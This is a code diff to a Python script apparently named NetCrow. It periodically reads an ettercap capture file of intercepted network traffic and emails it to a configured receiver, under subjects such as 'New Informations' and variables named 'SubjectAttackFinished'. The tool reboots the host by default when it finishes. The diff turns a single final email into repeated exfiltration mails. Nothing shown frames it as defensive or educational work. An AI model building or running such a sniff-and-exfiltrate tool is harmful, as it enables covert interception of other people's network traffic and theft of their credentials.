@@ -20,8 +20,11 @@ Password = ""
 Reciever = ""
 
 SaveDelay = 15			# Time Delay before Saving 
-ReRun = 10			# Repetition of Saving
-FinishExecution = "reboot" 	# Possible "reboot" "shutdown" "stay" - Standart "reboot"
+ReRun = 10			# Amount of Information Mails
+InfTime = 12			# Every SaveDelay * InfTime [Sec] --> New Information Mail
+				# --> NetCrow runs SaveDelay * InfTime * ReRun [Sec]
+				# --> NetCrow runs by default 30min or 1800sek
+FinishExecution = "reboot"	# Possible "reboot" "shutdown" "stay" - Standart "reboot"
 
 nettest = 0
 SendBoot = 0
@@ -130,24 +133,31 @@ def AutoEmailSend():
 	
 	# Loop 
 	BackupsAnzahl = 0 
+	TempVarInf = 0
 	while BackupsAnzahl < ReRun:
-		time.sleep(SaveDelay)
+		while(TempVarInf < InfTime):
+			time.sleep(SaveDelay)
+			TempVarInf = TempVarInf + 1
+		TempVarInf = 0
 		SaveOldFile()
+		
+		# Send Mail
+		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
+       		Date = time.strftime("%d/%m/%Y")
+		SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
+		
+		# Getting and Setting Text
+		ettertext = open(Path + "/ettercap.txt", 'rb')
+		ettermsg = MIMEText(ettertext.read())
+		ettertext.close()
+		TextAttackFinished = ettermsg
+		
+		# Sending Email
+		SendMail(SubjectAttackFinished, TextAttackFinished)
+		
 		BackupsAnzahl = BackupsAnzahl + 1
 
-	# Send Mail
-	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
-       	Date = time.strftime("%d/%m/%Y")
-	SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
 	
-	# Getting and Setting Text
-	ettertext = open(Path + "/ettercap.txt", 'rb')
-	ettermsg = MIMEText(ettertext.read())
-	ettertext.close()
-	TextAttackFinished = ettermsg
-
-	# Sending Email
-	SendMail(SubjectAttackFinished, TextAttackFinished)
 
 
 def SendMail(Subject, Text):
